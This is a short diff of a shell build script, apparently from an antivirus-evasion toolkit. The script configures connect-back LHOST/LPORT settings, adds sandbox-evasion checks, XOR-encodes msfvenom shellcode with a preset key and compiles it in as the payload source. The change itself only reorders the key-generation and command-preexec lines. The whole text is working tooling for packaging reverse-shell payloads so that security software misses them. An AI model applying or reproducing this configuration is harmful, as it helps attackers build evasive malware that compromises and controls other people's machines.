@@ -24,6 +24,11 @@ cat banner.txt
 # override connect-back settings here, if necessary
 LPORT=$GLOBAL_LPORT
 LHOST=$GLOBAL_LHOST
+# no command preexec
+set_command_source no_data
+set_command_exec no_command
+# generate key file
+generate_key preset aabbcc12de input/key_raw.txt
 # enable debug print
 enable_debug_print
 #CONFIGURATION_END
@@ -40,18 +45,11 @@ add_evasion fopen_sandbox_evasion 'c:\\windows\\system.ini'
 add_evasion gethostbyname_sandbox_evasion 'this.that'
 reset_evasion_technique_counter
 
-# generate key file
-generate_key preset aabbcc12de input/key_raw.txt
-
 # encode msfvenom shellcode
 encode_payload xor input/sc_raw.txt input/scenc_raw.txt input/key_raw.txt
 
 # array name buf is expected by static_from_file retrieval method
 ./tools/data_raw_to_c/data_raw_to_c input/scenc_raw.txt input/scenc_c.txt buf
-
-# no command preexec
-set_command_source no_data
-set_command_exec no_command
 
 # set shellcode source
 set_payload_source static_from_file input/scenc_c.txt
